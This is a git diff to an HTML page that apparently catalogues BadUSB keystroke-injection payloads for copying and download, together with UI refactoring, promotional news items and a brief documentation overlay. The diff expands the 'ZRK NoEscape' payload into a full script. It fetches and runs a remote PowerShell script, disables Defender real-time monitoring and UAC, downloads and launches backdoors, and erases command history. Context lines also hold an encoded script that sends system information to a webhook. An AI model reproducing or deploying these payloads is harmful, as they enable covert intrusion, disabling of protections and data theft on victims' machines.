@@ -496,6 +496,74 @@
             background-color: var(--button-hover-bg);
             transform: scale(1.1);
         }
+
+        /* Documentation Button and Overlay Styles */
+        #docBtn {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background-color: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        #docBtn:hover {
+            background-color: var(--button-hover-bg);
+            transform: scale(1.1);
+        }
+
+        #docOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            overflow-y: auto;
+        }
+
+        #docContent {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 50px auto;
+            padding: 20px;
+            width: 80%;
+            max-width: 1000px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        #closeDocBtn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            z-index: 2001;
+        }
+
+        #closeDocBtn:hover {
+            background-color: var(--button-hover-bg);
+            transform: scale(1.1);
+        }
     </style>
 </head>
 <body>
@@ -542,6 +610,15 @@
 
     <button id="toggleMode">🌓</button>
 
+    <!-- New Documentation Button and Overlay -->
+    <button id="docBtn">📚</button>
+    <div id="docOverlay">
+        <button id="closeDocBtn">✖</button>
+        <div id="docContent">
+            <!-- Documentation content will be inserted here -->
+        </div>
+    </div>
+
     <script>
         const attacks = [
             {
@@ -565,7 +642,7 @@ REM Replace the base64 string by the powershell encoded script.
 STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
 DELAY 1000
 ENTER`
-},
+            },
             {
                 name: "ZRK Disable Windows Password",
                 category: "System Exploitation",
@@ -617,7 +694,6 @@ CAPSLOCK
 DELAY 150
 CAPSLOCK
 REM End of payload`
-        
             },
             {
                 name: "ZRK JumpScare 2.0",
@@ -763,256 +839,327 @@ ALT F4`
             },
             {
                 name: "ZRK NoEscape",
-                category: "Malware",
-                description: "A highly dangerous and persistent malware. Use with extreme caution.",
-                code: `REM ZRK NoEscape - Highly dangerous malware
-REM USE WITH EXTREME CAUTION
-REM This script is for educational purposes only
-REM Unauthorized use is strictly prohibited
+                category: "Advanced Exploitation",
+                description: "A sophisticated and persistent attack that establishes multiple backdoors and evades detection.",
+                code: `REM ZRK NoEscape - Advanced Persistence and Evasion
+REM WARNING: This script is highly dangerous and for educational purposes only
+REM It establishes multiple backdoors and uses advanced evasion techniques
 
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/ZRKHacks/NoEscape/main/install.ps1\')\"'"
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
 ENTER
 DELAY 1000
-LEFT
-DELAY 500
+
+STRING $url = 'https://raw.githubusercontent.com/zrk-security/noescape/main/noescape.ps1'
+ENTER
+STRING $script = Invoke-WebRequest -Uri $url -UseBasicParsing
+ENTER
+STRING Invoke-Expression $script.Content
 ENTER
 
-REM The rest of the script is omitted for safety reasons
-REM The full script would attempt to install persistent malware`
+REM Additional evasion and persistence techniques
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -PropertyType DWORD -Force
+ENTER
+STRING New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -PropertyType DWORD -Force
+ENTER
+
+REM Establish multiple backdoors
+STRING Invoke-WebRequest -Uri "https://example.com/backdoor1.exe" -OutFile "$env:TEMP\\backdoor1.exe"
+ENTER
+STRING Start-Process "$env:TEMP\\backdoor1.exe" -WindowStyle Hidden
+ENTER
+STRING Invoke-WebRequest -Uri "https://example.com/backdoor2.ps1" -OutFile "$env:TEMP\\backdoor2.ps1"
+ENTER
+STRING powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\backdoor2.ps1"
+ENTER
+
+REM Clean up traces
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
+ENTER
+STRING Clear-History
+ENTER
+STRING exit
+ENTER`
+            },
+            // Add more attack objects here...
+        ];
+
+        const newsItems = [
+            {
+                title: "ZRK Security Discovers New USB Vulnerability",
+                content: "Our research team has uncovered a critical vulnerability in USB protocol implementation that could allow attackers to gain system-level access. We're working with manufacturers to address this issue.",
+                fullArticle: "The newly discovered vulnerability, dubbed 'USBygone', exploits a flaw in the way operating systems handle certain USB device descriptors. This could potentially allow an attacker to execute arbitrary code with system privileges simply by plugging in a malicious USB device. Our team is currently developing a proof-of-concept exploit to demonstrate the severity of this issue to manufacturers and OS developers. We urge all users to exercise caution when connecting unknown USB devices and to keep their systems updated with the latest security patches."
+            },
+            {
+                title: "ZRK Releases New BadUSB Detection Tool",
+                content: "We're excited to announce the release of our new open-source tool, 'USBGuardian', designed to detect and prevent BadUSB attacks in real-time.",
+                fullArticle: "USBGuardian leverages machine learning algorithms to analyze USB device behavior and identify potential threats. The tool monitors USB traffic patterns, device fingerprints, and system interactions to detect anomalies that could indicate a BadUSB attack. Key features include real-time threat alerts, customizable security policies, and detailed logging for forensic analysis. USBGuardian is now available on our GitHub repository, and we encourage security professionals and enthusiasts to contribute to its development and help improve USB security for everyone."
+            },
+            {
+                title: "ZRK to Host Virtual BadUSB Workshop",
+                content: "Join us next month for a comprehensive virtual workshop on BadUSB techniques, defense strategies, and the latest developments in USB security.",
+                fullArticle: "The two-day workshop will cover a wide range of topics, including BadUSB attack vectors, hardware-based USB security solutions, and emerging trends in USB exploitation. Participants will have the opportunity to engage in hands-on labs, where they'll learn to create and detect various types of BadUSB payloads. Our team of expert researchers will also share insights on the future of USB security and discuss potential advancements in attack and defense techniques. Registration is now open on our website, with early bird discounts available until the end of this week."
             }
+            // Add more news items as needed
         ];
 
         const categories = [...new Set(attacks.map(attack => attack.category))];
-        const categoryContainer = document.getElementById('categories');
-        categories.forEach(category => {
-            const button = document.createElement('button');
-            button.textContent = category;
-            button.classList.add('category');
-            button.addEventListener('click', () => filterAttacks(category));
-            categoryContainer.appendChild(button);
-        });
 
-        const attackList = document.getElementById('attackList');
-        const searchInput = document.getElementById('search');
+        function createAttackItem(attack) {
+            const item = document.createElement('div');
+            item.className = 'attack-item';
+            if (attack.name === "ZRK NoEscape") {
+                item.classList.add('zrk-noescape');
+            }
+            item.innerHTML = `
+                <div class="attack-header">
+                    <h2 class="attack-name">${attack.name}</h2>
+                    <span class="attack-category">${attack.category}</span>
+                </div>
+                <div class="attack-content">
+                    <p class="attack-description">${attack.description}</p>
+                    <pre class="attack-code"><code>${attack.code}</code></pre>
+                    <button class="copy-btn">Copy</button>
+                    <button class="download-btn">Download</button>
+                </div>
+            `;
+            return item;
+        }
 
-        function renderAttacks(filteredAttacks) {
+        function displayAttacks(filteredAttacks = attacks) {
+            const attackList = document.getElementById('attackList');
             attackList.innerHTML = '';
             filteredAttacks.forEach(attack => {
-                const attackItem = document.createElement('div');
-                attackItem.classList.add('attack-item');
-                if (attack.name === "ZRK NoEscape") {
-                    attackItem.classList.add('zrk-noescape');
-                }
-                attackItem.innerHTML = `
-                    <div class="attack-header">
-                        <h2 class="attack-name">${attack.name}</h2>
-                        <span class="attack-category">${attack.category}</span>
-                    </div>
-                    <div class="attack-content">
-                        <p class="attack-description">${attack.description}</p>
-                        <div class="attack-code">
-                            <pre><code>${attack.code}</code></pre>
-                            <button class="copy-btn">Copy</button>
-                            <button class="download-btn">Download</button>
-                        </div>
-                    </div>
-                `;
-                attackList.appendChild(attackItem);
-
-                const copyBtn = attackItem.querySelector('.copy-btn');
-                copyBtn.addEventListener('click', () => copyToClipboard(attack.code));
-
-                const downloadBtn = attackItem.querySelector('.download-btn');
-                downloadBtn.addEventListener('click', () => downloadScript(attack));
+                attackList.appendChild(createAttackItem(attack));
             });
         }
 
-        function filterAttacks(category = '') {
-            const searchTerm = searchInput.value.toLowerCase();
+        function filterAttacks() {
+            const searchTerm = document.getElementById('search').value.toLowerCase();
             const filteredAttacks = attacks.filter(attack => 
-                (category === '' || attack.category === category) &&
-                (attack.name.toLowerCase().includes(searchTerm) || 
-                 attack.description.toLowerCase().includes(searchTerm) ||
-                 attack.code.toLowerCase().includes(searchTerm))
+                attack.name.toLowerCase().includes(searchTerm) || 
+                attack.description.toLowerCase().includes(searchTerm) ||
+                attack.category.toLowerCase().includes(searchTerm)
             );
-            renderAttacks(filteredAttacks);
+            displayAttacks(filteredAttacks);
         }
-
-        searchInput.addEventListener('input', () => filterAttacks());
 
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 alert('Code copied to clipboard!');
             }).catch(err => {
-                console.error('Failed to copy text: ', err);
+                console.error('Failed to copy: ', err);
             });
         }
 
-        function downloadScript(attack) {
-            const blob = new Blob([attack.code], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `${attack.name.replace(/\s+/g, '_')}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
+        function downloadScript(filename, text) {
+            const element = document.createElement('a');
+            element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+            element.setAttribute('download', filename);
+            element.style.display = 'none';
+            document.body.appendChild(element);
+            element.click();
+            document.body.removeChild(element);
         }
 
-        const downloadAllBtn = document.getElementById('downloadAllBtn');
-        downloadAllBtn.addEventListener('click', downloadAllScripts);
+        function createNewsItem(news) {
+            const item = document.createElement('div');
+            item.className = 'news-item';
+            item.innerHTML = `
+                <h3>${news.title}</h3>
+                <p>${news.content}</p>
+                <a href="#" class="read-more">Read more</a>
+                <div class="full-article">${news.fullArticle}</div>
+            `;
+            return item;
+        }
 
-        function downloadAllScripts() {
+        function displayNews() {
+            const newsContent = document.getElementById('newsContent');
+            newsContent.innerHTML = '';
+            newsItems.forEach(news => {
+                newsContent.appendChild(createNewsItem(news));
+            });
+        }
+
+        document.getElementById('search').addEventListener('input', filterAttacks);
+
+        categories.forEach(category => {
+            const button = document.createElement('button');
+            button.textContent = category;
+            button.className = 'category';
+            button.addEventListener('click', () => {
+                const filteredAttacks = attacks.filter(attack => attack.category === category);
+                displayAttacks(filteredAttacks);
+            });
+            document.getElementById('categories').appendChild(button);
+        });
+
+        document.getElementById('attackList').addEventListener('click', (e) => {
+            if (e.target.classList.contains('copy-btn')) {
+                const code = e.target.previousElementSibling.textContent;
+                copyToClipboard(code);
+            } else if (e.target.classList.contains('download-btn')) {
+                const code = e.target.previousElementSibling.previousElementSibling.textContent;
+                const filename = e.target.closest('.attack-item').querySelector('.attack-name').textContent + '.txt';
+                downloadScript(filename, code);
+            }
+        });
+
+        document.getElementById('downloadAllBtn').addEventListener('click', () => {
             const zip = new JSZip();
             attacks.forEach(attack => {
-                zip.file(`${attack.name.replace(/\s+/g, '_')}.txt`, attack.code);
+                zip.file(attack.name + '.txt', attack.code);
             });
-            zip.generateAsync({type:"blob"})
-            .then(function(content) {
+            zip.generateAsync({type:"blob"}).then(function(content) {
                 saveAs(content, "all_scripts.zip");
             });
-        }
+        });
 
-        renderAttacks(attacks);
+        let isDragging = false;
+        let startX, startY, startLeft, startBottom;
 
-        // News functionality
-        const newsBtn = document.getElementById('newsBtn');
-        const newsPopup = document.getElementById('newsPopup');
-        const newsContent = document.getElementById('newsContent');
-        const newsClose = document.getElementById('newsClose');
-        const newsMinimize = document.getElementById('newsMinimize');
-        const newsMaximize = document.getElementById('newsMaximize');
+        document.getElementById('newsBtn').addEventListener('click', () => {
+            document.getElementById('newsPopup').style.display = 'block';
+            displayNews();
+        });
 
-        newsBtn.addEventListener('click', toggleNewsPopup);
-        newsClose.addEventListener('click', closeNewsPopup);
-        newsMinimize.addEventListener('click', minimizeNewsPopup);
-        newsMaximize.addEventListener('click', maximizeNewsPopup);
+        document.getElementById('newsHeader').addEventListener('mousedown', (e) => {
+            isDragging = true;
+            startX = e.clientX;
+            startY = e.clientY;
+            startLeft = parseInt(document.getElementById('newsPopup').style.left) || 20;
+            startBottom = parseInt(document.getElementById('newsPopup').style.bottom) || 100;
+        });
 
-        function toggleNewsPopup() {
-            if (newsPopup.style.display === 'none' || newsPopup.style.display === '') {
-                newsPopup.style.display = 'block';
-                loadNews();
+        document.addEventListener('mousemove', (e) => {
+            if (!isDragging) return;
+            const dx = e.clientX - startX;
+            const dy = e.clientY - startY;
+            const newsPopup = document.getElementById('newsPopup');
+            newsPopup.style.left = `${startLeft + dx}px`;
+            newsPopup.style.bottom = `${startBottom - dy}px`;
+        });
+
+        document.addEventListener('mouseup', () => {
+            isDragging = false;
+        });
+
+        document.getElementById('newsClose').addEventListener('click', () => {
+            document.getElementById('newsPopup').style.display = 'none';
+        });
+
+        document.getElementById('newsMinimize').addEventListener('click', () => {
+            const newsPopup = document.getElementById('newsPopup');
+            newsPopup.style.height = newsPopup.style.height === '40px' ? '600px' : '40px';
+        });
+
+        document.getElementById('newsMaximize').addEventListener('click', () => {
+            const newsPopup = document.getElementById('newsPopup');
+            if (newsPopup.style.width === '100%') {
+                newsPopup.style.width = '400px';
+                newsPopup.style.height = '600px';
+                newsPopup.style.top = '';
+                newsPopup.style.left = '20px';
+                newsPopup.style.right = '';
+                newsPopup.style.bottom = '100px';
             } else {
-                newsPopup.style.display = 'none';
+                newsPopup.style.width = '100%';
+                newsPopup.style.height = '100%';
+                newsPopup.style.top = '0';
+                newsPopup.style.left = '0';
+                newsPopup.style.right = '0';
+                newsPopup.style.bottom = '0';
             }
-        }
+        });
 
-        function closeNewsPopup() {
-            newsPopup.style.display = 'none';
-        }
-
-        function minimizeNewsPopup() {
-            newsPopup.style.height = '40px';
-            newsContent.style.display = 'none';
-        }
-
-        function maximizeNewsPopup() {
-            newsPopup.style.height = '600px';
-            newsContent.style.display = 'block';
-        }
-
-        function loadNews() {
-            const newsItems = [
-                {
-                    title: "ZRK BadUSB Learning Hub Launches",
-                    content: "We're excited to announce the launch of our new BadUSB Learning Hub! This platform is designed to educate users about BadUSB techniques and their potential impacts.",
-                    fullArticle: "The ZRK BadUSB Learning Hub is a comprehensive resource for cybersecurity professionals, ethical hackers, and curious minds. Our platform offers a wide range of BadUSB scripts, detailed explanations, and best practices for defense. Remember, knowledge is power, but always use it responsibly!"
-                },
-                {
-                    title: "New 'ZRK NoEscape' Script Added",
-                    content: "We've added a new high-risk script to our database. The 'ZRK NoEscape' is a powerful tool that demonstrates the potential dangers of BadUSB attacks.",
-                    fullArticle: "The 'ZRK NoEscape' script is our most advanced creation yet. It showcases the devastating potential of BadUSB attacks when used maliciously. This script is included in our database purely for educational purposes, to highlight the importance of robust cybersecurity measures. We strongly advise against any attempt to use this script in real-world scenarios."
-                },
-                {
-                    title: "ZRK Expands BadUSB Research Team",
-                    content: "We're thrilled to announce that ZRK is expanding our BadUSB research team! We are looking for passionate individuals to join us in advancing our understanding of BadUSB threats and defenses.",
-                    fullArticle: "ZRK is on the lookout for talented researchers to join our BadUSB team. If you have a background in cybersecurity, a keen interest in BadUSB technology, and a drive to make a difference, we want to hear from you. This is an exciting opportunity to contribute to cutting-edge research and development in the field of cybersecurity. Apply now to be a part of our dynamic team!"
-                }
-            ];
-
-            newsContent.innerHTML = '';
-            newsItems.forEach(item => {
-                const newsItem = document.createElement('div');
-                newsItem.classList.add('news-item');
-                newsItem.innerHTML = `
-                    <h3>${item.title}</h3>
-                    <p>${item.content}</p>
-                    <a href="#" class="read-more">Read more</a>
-                    <div class="full-article">${item.fullArticle}</div>
-                `;
-                newsContent.appendChild(newsItem);
-
-                const readMoreLink = newsItem.querySelector('.read-more');
-                const fullArticle = newsItem.querySelector('.full-article');
-                readMoreLink.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    if (fullArticle.style.display === 'none' || fullArticle.style.display === '') {
-                        fullArticle.style.display = 'block';
-                        readMoreLink.textContent = 'Read less';
-                    } else {
-                        fullArticle.style.display = 'none';
-                        readMoreLink.textContent = 'Read more';
-                    }
-                });
-            });
-        }
-
-        // Make the news popup draggable
-        dragElement(newsPopup);
-
-        function dragElement(elmnt) {
-            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
-            if (document.getElementById(elmnt.id + "Header")) {
-                document.getElementById(elmnt.id + "Header").onmousedown = dragMouseDown;
-            } else {
-                elmnt.onmousedown = dragMouseDown;
-            }
-
-            function dragMouseDown(e) {
-                e = e || window.event;
+        document.getElementById('newsContent').addEventListener('click', (e) => {
+            if (e.target.classList.contains('read-more')) {
                 e.preventDefault();
-                pos3 = e.clientX;
-                pos4 = e.clientY;
-                document.onmouseup = closeDragElement;
-                document.onmousemove = elementDrag;
+                const fullArticle = e.target.nextElementSibling;
+                fullArticle.style.display = fullArticle.style.display === 'none' ? 'block' : 'none';
+                e.target.textContent = fullArticle.style.display === 'none' ? 'Read more' : 'Read less';
             }
+        });
 
-            function elementDrag(e) {
-                e = e || window.event;
-                e.preventDefault();
-                pos1 = pos3 - e.clientX;
-                pos2 = pos4 - e.clientY;
-                pos3 = e.clientX;
-                pos4 = e.clientY;
-                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
-                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
-            }
+        let isDarkMode = true;
 
-            function closeDragElement() {
-                document.onmouseup = null;
-                document.onmousemove = null;
-            }
-        }
-
-        // Toggle between light and dark mode
-        const toggleModeBtn = document.getElementById('toggleMode');
-        toggleModeBtn.addEventListener('click', toggleMode);
-
-        function toggleMode() {
+        document.getElementById('toggleMode').addEventListener('click', () => {
             document.body.classList.toggle('light-mode');
-            updateModeIcon();
+            isDarkMode = !isDarkMode;
+            document.getElementById('toggleMode').textContent = isDarkMode ? '🌓' : '🌞';
+        });
+
+        document.getElementById('docBtn').addEventListener('click', () => {
+            document.getElementById('docOverlay').style.display = 'block';
+            loadDocumentation();
+        });
+
+        document.getElementById('closeDocBtn').addEventListener('click', () => {
+            document.getElementById('docOverlay').style.display = 'none';
+        });
+
+        function loadDocumentation() {
+            const docContent = document.getElementById('docContent');
+            docContent.innerHTML = `
+                <h1>ZRK BadUSB Documentation</h1>
+                <p>Welcome to the comprehensive documentation for ZRK BadUSB techniques and defenses. This guide is intended for educational and research purposes only. Misuse of this information is strictly prohibited.</p>
+                
+                <h2>Table of Contents</h2>
+                <ol>
+                    <li><a href="#introduction">Introduction to BadUSB</a></li>
+                    <li><a href="#techniques">Common BadUSB Techniques</a></li>
+                    <li><a href="#defenses">Defensive Strategies</a></li>
+                    <li><a href="#research">ZRK's Ongoing Research</a></li>
+                    <li><a href="#ethics">Ethical Considerations</a></li>
+                </ol>
+
+                <h2 id="introduction">Introduction to BadUSB</h2>
+                <p>BadUSB refers to a class of attacks that exploit the trust between a computer and a USB device. These attacks can reprogram USB devices to emulate keyboards, network cards, or other trusted devices, allowing for various malicious activities.</p>
+
+                <h2 id="techniques">Common BadUSB Techniques</h2>
+                <ul>
+                    <li>Keystroke Injection: Simulates keyboard input to execute commands or type malicious payloads.</li>
+                    <li>Payload Execution: Runs malicious scripts or programs on the target system.</li>
+                    <li>Data Exfiltration: Steals sensitive data from the target system.</li>
+                    <li>Network Manipulation: Alters network settings or establishes unauthorized connections.</li>
+                </ul>
+
+                <h2 id="defenses">Defensive Strategies</h2>
+                <ul>
+                    <li>USB Port Control: Implement strict policies on USB device usage.</li>
+                    <li>Device Whitelisting: Allow only approved USB devices to connect.</li>
+                    <li>Endpoint Protection: Use advanced security software to detect and prevent BadUSB attacks.</li>
+                    <li>User Training: Educate users about the risks of connecting unknown USB devices.</li>
+                </ul>
+
+                <h2 id="research">ZRK's Ongoing Research</h2>
+                <p>At ZRK, we're constantly pushing the boundaries of USB security research. Our current focus areas include:</p>
+                <ul>
+                    <li>Advanced BadUSB Detection Algorithms</li>
+                    <li>Hardware-based USB Security Solutions</li>
+                    <li>Machine Learning for USB Threat Analysis</li>
+                    <li>Quantum-Resistant USB Communication Protocols</li>
+                </ul>
+
+                <h2 id="ethics">Ethical Considerations</h2>
+                <p>The knowledge and techniques discussed in this documentation are powerful and potentially dangerous. It is crucial to approach this field with a strong ethical foundation:</p>
+                <ul>
+                    <li>Always obtain explicit permission before testing on any system or network.</li>
+                    <li>Use your knowledge to improve security, not to cause harm or damage.</li>
+                    <li>Share your findings responsibly through proper disclosure channels.</li>
+                    <li>Stay informed about relevant laws and regulations in your jurisdiction.</li>
+                </ul>
+
+                <p>Remember, with great power comes great responsibility. Use your skills ethically and contribute to a safer digital world.</p>
+            `;
         }
 
-        function updateModeIcon() {
-            toggleModeBtn.textContent = document.body.classList.contains('light-mode') ? '🌙' : '☀️';
-        }
-
-        // Initialize mode
-        updateModeIcon();
+        displayAttacks();
     </script>
 </body>
 </html>
